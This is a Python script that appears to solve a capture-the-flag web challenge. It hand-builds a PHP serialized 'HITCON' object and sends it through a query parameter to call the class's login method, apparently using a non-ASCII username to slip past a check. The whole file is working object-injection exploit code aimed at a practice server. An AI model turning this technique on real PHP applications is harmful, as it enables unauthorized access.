import requests, urllib.parse

base='http://8a144f6c-ce1d-43d2-b422-ceed68966234.node.pediy.com:81/'
requests.get(base, params={'noggnogg':'1'}, timeout=15)

def sb(s):
    return s.encode('utf-8')

def field(name_b, value_b):
    return b's:' + str(len(name_b)).encode() + b':"' + name_b + b'";' + value_b

def svalue(v_b):
    return b's:' + str(len(v_b)).encode() + b':"' + v_b + b'";'

method_name = b'\x00HITCON\x00method'
args_name   = b'\x00HITCON\x00args'
conn_name   = b'\x00HITCON\x00conn'

def make_login_plain(user, pw):
    ub = sb(user)
    pb = sb(pw)

    args = (
        b'a:2:{' +
        field(b'username', svalue(ub)) +
        field(b'password', svalue(pb)) +
        b'}'
    )

    inner = (
        b'O:6:"HITCON":3:{' +
        field(method_name, svalue(b'login')) +
        field(args_name, args) +
        field(conn_name, b'i:0;') +
        b'}'
    )
    return inner

payload = make_login_plain('ORÄNGE', 'babytrick1234')
url = base + '?data=' + urllib.parse.quote_from_bytes(payload)

r = requests.get(url, timeout=15)
print(r.text)
